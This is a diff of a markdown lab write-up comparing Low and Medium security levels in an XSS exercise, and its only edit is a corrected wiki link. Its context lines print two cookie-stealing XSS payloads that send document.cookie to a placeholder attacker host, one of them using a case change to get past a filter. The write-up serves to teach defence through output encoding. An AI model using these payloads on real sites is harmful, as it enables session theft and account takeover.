@@ -136,7 +136,7 @@ submitted via Burp Repeater (intercept the dropdown's POST request and edit the 
 <ScRiPt>document.location='http://<attacker-ip>/steal?c='+document.cookie</ScRiPt>
 <img src=x onerror="document.location='http://<attacker-ip>/steal?c='+document.cookie">
 ```
-The comparison write-up: Low trusted client-side input entirely; Medium added a naive string-match filter that a case change or an alternate injection vector (an event handler instead of a `<script>` tag) defeats outright — the fix needed is context-aware output encoding (see [[../04-web-security/01-input-validation-and-output-encoding|input-validation-and-output-encoding]]), not string-blacklisting.
+The comparison write-up: Low trusted client-side input entirely; Medium added a naive string-match filter that a case change or an alternate injection vector (an event handler instead of a `<script>` tag) defeats outright — the fix needed is context-aware output encoding (see [[cybersecurity/04-web-security/01-input-validation-and-output-encoding|input-validation-and-output-encoding]]), not string-blacklisting.
 
 ---
 
